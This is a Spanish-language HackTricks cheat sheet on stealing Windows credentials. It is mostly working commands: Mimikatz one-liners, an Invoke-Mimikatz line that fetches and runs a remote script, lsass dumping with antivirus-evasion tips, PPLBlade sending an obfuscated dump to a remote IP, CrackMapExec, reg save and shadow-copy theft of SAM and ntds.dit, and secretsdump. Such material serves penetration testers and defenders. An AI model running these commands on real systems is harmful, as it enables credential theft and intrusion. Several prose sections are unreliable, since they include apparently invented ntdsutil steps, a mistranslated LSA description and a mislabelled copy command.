# Robo de Credenciales de Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mimikatz de Credenciales
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encuentra otras cosas que Mimikatz puede hacer en** [**esta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Aprende sobre algunas posibles protecciones de credenciales aquí.**](credentials-protections.md) **Estas protecciones podrían evitar que Mimikatz extraiga algunas credenciales.**

## Credenciales con Meterpreter

Utiliza el [**Plugin de Credenciales**](https://github.com/carlospolop/MSF-Credentials) **que he creado para buscar contraseñas y hashes** dentro de la víctima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Evitando la detección del antivirus

### Procdump + Mimikatz

Como **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**es una herramienta legítima de Microsoft**, no es detectada por Defender.\
Puedes usar esta herramienta para **volcar el proceso lsass**, **descargar el volcado** y **extraer** las **credenciales localmente** del volcado.

{% code title="Volcar lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Extraer credenciales del volcado" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Este proceso se realiza automáticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Algunos **AV** pueden **detectar** como **malicioso** el uso de **procdump.exe para volcar lsass.exe**, esto se debe a que están **detectando** las cadenas **"procdump.exe" y "lsass.exe"**. Por lo tanto, es más sigiloso **pasar** como **argumento** el **PID** de lsass.exe a procdump **en lugar de** el nombre lsass.exe.

### Volcando lsass con **comsvcs.dll**

Hay una DLL llamada **comsvcs.dll**, ubicada en `C:\Windows\System32`, que **vuelca la memoria del proceso** cada vez que se **bloquea**. Esta DLL contiene una **función** llamada **`MiniDumpW`** que está escrita para que se pueda llamar con `rundll32.exe`.\
Los dos primeros argumentos no se utilizan, pero el tercero se divide en 3 partes. La primera parte es el ID del proceso que se va a volcar, la segunda parte es la ubicación del archivo de volcado y la tercera parte es la palabra **full**. No hay otra opción.\
Una vez que se han analizado estos 3 argumentos, básicamente esta DLL crea el archivo de volcado y vuelca el proceso especificado en ese archivo de volcado.\
Gracias a esta función, podemos usar **comsvcs.dll** para volcar el proceso lsass en lugar de subir procdump y ejecutarlo. (Esta información fue extraída de [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
Solo tenemos que tener en cuenta que esta técnica solo se puede ejecutar como **SYSTEM**.

**Puedes automatizar este proceso con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Volcado de lsass con el Administrador de tareas**

1. Haz clic derecho en la barra de tareas y selecciona Administrador de tareas.
2. Haz clic en Más detalles.
3. Busca el proceso "Proceso de Autoridad de Seguridad Local" en la pestaña Procesos.
4. Haz clic derecho en el proceso "Proceso de Autoridad de Seguridad Local" y selecciona "Crear archivo de volcado".

### Volcado de lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un archivo binario firmado por Microsoft que forma parte de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) es una herramienta de volcado de procesos protegidos que admite la ofuscación de volcados de memoria y su transferencia a estaciones de trabajo remotas sin dejar rastro en el disco.

**Funcionalidades clave**:

1. Bypass de la protección PPL
2. Ofuscación de archivos de volcado de memoria para evadir los mecanismos de detección basados en firmas de Defender
3. Carga de volcado de memoria con métodos de carga RAW y SMB sin dejar rastro en el disco (volcado sin archivo)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Volcar hashes SAM

CrackMapExec es una herramienta de pentesting que se utiliza para realizar ataques de enumeración y explotación en entornos de Windows. Una de las funcionalidades de CrackMapExec es la capacidad de volcar los hashes SAM de un sistema Windows.

Los hashes SAM son contraseñas almacenadas en el registro de Windows y se utilizan para autenticar a los usuarios en el sistema. Al volcar los hashes SAM, un atacante puede obtener acceso a las contraseñas de los usuarios y utilizarlas para acceder a otros sistemas o realizar ataques de fuerza bruta.

Para volcar los hashes SAM utilizando CrackMapExec, sigue estos pasos:

1. Ejecuta CrackMapExec en tu máquina de ataque.
2. Utiliza el comando `cme smb <target> -u <username> -p <password> --sam` para iniciar una sesión SMB en el objetivo y volcar los hashes SAM.
3. Una vez que se complete el volcado, los hashes SAM se guardarán en un archivo de texto en tu máquina de ataque.

Es importante tener en cuenta que el volcado de hashes SAM es una actividad ilegal sin el consentimiento del propietario del sistema. Solo debes utilizar esta técnica en entornos de prueba o con el permiso explícito del propietario del sistema.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Volcar secretos de LSA

El volcado de secretos de LSA es una técnica utilizada para extraer información confidencial almacenada en el Registro de seguridad local (LSA) de un sistema Windows. Estos secretos pueden incluir contraseñas, claves de cifrado y otros datos sensibles.

#### Descripción

El Registro de seguridad local (LSA) es una base de datos encriptada que almacena información confidencial relacionada con la autenticación y la seguridad del sistema. Algunos de los secretos almacenados en el LSA incluyen:

- Contraseñas de cuentas de usuario
- Claves de cifrado
- Credenciales de inicio de sesión en red
- Certificados digitales

El volcado de secretos de LSA implica extraer estos secretos del LSA y guardarlos en un archivo para su posterior análisis. Esto se puede lograr utilizando herramientas como Mimikatz o utilizando técnicas de programación para acceder directamente al LSA.

#### Impacto

El volcado de secretos de LSA puede tener un impacto significativo en la seguridad de un sistema. Al obtener acceso a contraseñas y otras credenciales almacenadas en el LSA, un atacante puede comprometer cuentas de usuario, acceder a sistemas y datos sensibles, y realizar ataques adicionales, como el movimiento lateral en una red.

#### Mitigación

Para mitigar el riesgo de volcado de secretos de LSA, se recomienda implementar las siguientes medidas de seguridad:

- Mantener el sistema operativo y las aplicaciones actualizadas con los últimos parches de seguridad.
- Utilizar soluciones de seguridad, como firewalls y sistemas de detección de intrusiones, para detectar y bloquear actividades sospechosas.
- Limitar los privilegios de acceso a cuentas de usuario y utilizar contraseñas fuertes y únicas.
- Utilizar herramientas de cifrado para proteger los datos almacenados en el sistema.
- Implementar políticas de seguridad que restrinjan el acceso a los archivos y registros del sistema.

#### Referencias

- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Microsoft Security Guidance](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/lsass-security-guidance)
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Volcar el archivo NTDS.dit del controlador de dominio objetivo

Para obtener las credenciales almacenadas en un controlador de dominio (DC) de Windows, es necesario extraer el archivo NTDS.dit. Este archivo contiene la base de datos de Active Directory, que incluye información sobre los usuarios y sus contraseñas.

Para realizar esta tarea, se puede utilizar la herramienta `ntdsutil` que viene incluida en Windows Server. A continuación se detallan los pasos a seguir:

1. Iniciar sesión en el controlador de dominio objetivo con privilegios de administrador.
2. Abrir una ventana de comandos con privilegios elevados.
3. Ejecutar el siguiente comando para abrir la utilidad `ntdsutil`:

   ```
   ntdsutil
   ```

4. Una vez dentro de `ntdsutil`, ejecutar los siguientes comandos en orden:

   ```
   activate instance ntds
   ifm
   create full C:\path\to\output\folder
   quit
   quit
   ```

   Asegúrate de reemplazar `C:\path\to\output\folder` con la ruta de la carpeta donde deseas guardar el archivo NTDS.dit.

5. El archivo NTDS.dit se guardará en la ubicación especificada.

Una vez que hayas obtenido el archivo NTDS.dit, podrás utilizar herramientas como `mimikatz` para extraer las credenciales almacenadas en él.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Volcar el historial de contraseñas de NTDS.dit desde el controlador de dominio objetivo

Para obtener el historial de contraseñas almacenado en el archivo NTDS.dit de un controlador de dominio objetivo en Windows, podemos utilizar la herramienta `ntdsutil`. Sigue los pasos a continuación:

1. Inicia sesión en una máquina con privilegios de administrador en el dominio objetivo.
2. Abre una ventana de comandos con privilegios elevados.
3. Ejecuta el siguiente comando para iniciar `ntdsutil`:

   ```
   ntdsutil
   ```

4. Una vez dentro de `ntdsutil`, ejecuta los siguientes comandos en orden:

   ```
   activate instance ntds
   ifm
   create full C:\path\to\output\folder
   quit
   quit
   ```

   Asegúrate de reemplazar `C:\path\to\output\folder` con la ruta de la carpeta donde deseas guardar el archivo de volcado.

5. El comando `create full` creará una copia completa de la base de datos NTDS.dit en la ubicación especificada.

Una vez completados estos pasos, tendrás una copia del archivo NTDS.dit en la ubicación especificada. Puedes analizar este archivo para extraer el historial de contraseñas utilizando herramientas como `Mimikatz` u otras herramientas de análisis de contraseñas.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar el atributo pwdLastSet para cada cuenta de NTDS.dit

Para obtener el atributo `pwdLastSet` de cada cuenta en el archivo NTDS.dit, puedes seguir estos pasos:

1. Abre una ventana de comandos como administrador.
2. Navega hasta el directorio donde se encuentra el archivo NTDS.dit. Por lo general, se encuentra en la ruta `C:\Windows\NTDS`.
3. Ejecuta el siguiente comando para abrir la base de datos NTDS.dit:

```plaintext
ntdsutil
activate instance ntds
```

4. Ejecuta el siguiente comando para mostrar las cuentas y sus atributos:

```plaintext
acquire credentials
list accounts
```

Esto mostrará una lista de todas las cuentas en NTDS.dit junto con sus atributos, incluido `pwdLastSet`.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Robando SAM y SYSTEM

Estos archivos deben estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM_. Pero **no puedes simplemente copiarlos de manera regular** porque están protegidos.

### Desde el Registro

La forma más sencilla de robar esos archivos es obtener una copia desde el registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Descarga** esos archivos en tu máquina Kali y **extrae los hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Copia de seguridad de volumen en sombra

Puedes realizar una copia de los archivos protegidos utilizando este servicio. Debes ser Administrador.

#### Usando vssadmin

El binario vssadmin solo está disponible en las versiones de Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Pero también puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro utilizado es "C:" y se guarda en C:\users\Public), pero puedes usar esto para copiar cualquier archivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Código del libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Finalmente, también podrías usar el [**script de PowerShell Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciales de Active Directory - NTDS.dit**

El archivo Ntds.dit es una base de datos que almacena datos de Active Directory, incluyendo información sobre objetos de usuario, grupos y membresía de grupos. Incluye los hashes de contraseñas de todos los usuarios en el dominio.

El importante archivo NTDS.dit se encuentra en: _%SystemRoom%/NTDS/ntds.dit_\
Este archivo es una base de datos Extensible Storage Engine (ESE) y está compuesto "oficialmente" por 3 tablas:

* **Tabla de datos**: Contiene la información sobre los objetos (usuarios, grupos...)
* **Tabla de enlaces**: Información sobre las relaciones (miembro de...)
* **Tabla SD**: Contiene los descriptores de seguridad de cada objeto

Más información sobre esto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utiliza Ntdsa.dll para interactuar con ese archivo y es utilizado por lsass.exe. Luego, parte del archivo NTDS.dit podría estar ubicado dentro de la memoria de `lsass` (puedes encontrar los datos más recientemente accedidos probablemente debido a la mejora de rendimiento mediante el uso de una caché).

#### Descifrando los hashes dentro de NTDS.dit

El hash está cifrado 3 veces:

1. Descifrar la Clave de Cifrado de Contraseña (PEK) utilizando la BOOTKEY y RC4.
2. Descifrar el hash utilizando PEK y RC4.
3. Descifrar el hash utilizando DES.

PEK tiene el mismo valor en cada controlador de dominio, pero está cifrado dentro del archivo NTDS.dit utilizando la BOOTKEY del archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio). Por eso, para obtener las credenciales del archivo NTDS.dit necesitas los archivos NTDS.dit y SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit utilizando Ntdsutil

Disponible desde Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
También puedes utilizar el truco de [**copia de sombra de volumen**](./#stealing-sam-and-system) para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del archivo **SYSTEM** (nuevamente, [**dúmpealo del registro o utiliza el truco de copia de sombra de volumen**](./#stealing-sam-and-system)).

### **Extrayendo hashes de NTDS.dit**

Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes utilizar herramientas como _secretsdump.py_ para **extraer los hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
También puedes **extraerlos automáticamente** utilizando un usuario de administrador de dominio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **archivos NTDS.dit grandes**, se recomienda extraerlos utilizando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, también puedes utilizar el módulo de **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Extrayendo objetos de dominio de NTDS.dit a una base de datos SQLite**

Los objetos de NTDS pueden ser extraídos a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen secretos, sino también los objetos completos y sus atributos para una mayor extracción de información cuando ya se ha recuperado el archivo NTDS.dit en bruto.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
El archivo `SYSTEM` es opcional pero permite la desencriptación de secretos (hashes NT y LM, credenciales suplementarias como contraseñas en texto plano, claves de kerberos o de confianza, historial de contraseñas NT y LM). Junto con otra información, se extraen los siguientes datos: cuentas de usuario y máquina con sus hashes, indicadores UAC, marca de tiempo del último inicio de sesión y cambio de contraseña, descripción de las cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol de unidades organizativas y membresía, dominios de confianza con tipo de confianza, dirección y atributos...

## Lazagne

Descarga el archivo binario desde [aquí](https://github.com/AlessandroZ/LaZagne/releases). Puedes usar este archivo binario para extraer credenciales de varios programas.
```
lazagne.exe all
```
## Otras herramientas para extraer credenciales de SAM y LSASS

### Windows credentials Editor (WCE)

Esta herramienta se puede utilizar para extraer credenciales de la memoria. Descárgala desde: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrae credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraer credenciales del archivo SAM

PwDump es una herramienta que permite extraer las credenciales almacenadas en el archivo SAM de un sistema Windows. El archivo SAM contiene las contraseñas de los usuarios locales en formato hash. Al extraer estas credenciales, un atacante puede intentar crackear las contraseñas y obtener acceso no autorizado al sistema.

PwDump se ejecuta en el contexto del sistema operativo y requiere privilegios de administrador para funcionar correctamente. Una vez ejecutado, PwDump buscará el archivo SAM en la ubicación predeterminada y extraerá los hashes de las contraseñas.

Es importante tener en cuenta que PwDump solo puede extraer las contraseñas almacenadas localmente en el sistema. No puede extraer las contraseñas de cuentas de dominio o de otros sistemas remotos.

Para utilizar PwDump, sigue estos pasos:

1. Descarga la herramienta PwDump en tu sistema Windows.
2. Ejecuta PwDump con privilegios de administrador.
3. PwDump buscará automáticamente el archivo SAM en la ubicación predeterminada y extraerá los hashes de las contraseñas.
4. Guarda los hashes de las contraseñas en un archivo para su posterior análisis y crackeo.

Recuerda que el uso de PwDump u otras herramientas similares para extraer credenciales sin autorización es ilegal y puede tener consecuencias legales graves. Solo debes utilizar estas herramientas en un entorno controlado y con el consentimiento explícito del propietario del sistema.
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Descárgalo desde: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) y simplemente **ejecútalo** y las contraseñas serán extraídas.

## Defensas

[Aprende sobre algunas protecciones de credenciales aquí.](credentials-protections.md)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
